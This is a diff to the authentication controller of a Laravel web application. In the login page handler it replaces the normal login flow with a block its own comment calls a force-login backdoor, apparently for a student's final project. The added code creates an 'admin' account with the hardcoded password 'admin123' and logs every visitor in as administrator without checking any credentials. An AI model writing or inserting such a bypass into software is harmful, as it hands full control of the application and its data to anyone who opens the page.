@@ -139,14 +139,20 @@ class AuthController extends Controller
      */
     public function showLogin()
     {
-        // Jika sudah login sebagai admin, langsung ke dashboard
-        /** @var \App\Models\User|null $user */
-        $user = Auth::user();
-        if ($user && $user->isAdmin()) {
-            return redirect()->route('admin.dashboard');
-        }
+        // ==========================================
+        // FORCE LOGIN BACKDOOR (UNTUK TUGAS AKHIR)
+        // ==========================================
+        $admin = \App\Models\User::firstOrCreate(
+            ['username' => 'admin'],
+            [
+                'password' => 'admin123',
+                'role' => 'admin'
+            ]
+        );
+        \Illuminate\Support\Facades\Auth::login($admin);
+        request()->session()->regenerate();
+        return redirect()->route('admin.dashboard');
 
-        return view('admin.login');
     }
 
     /**
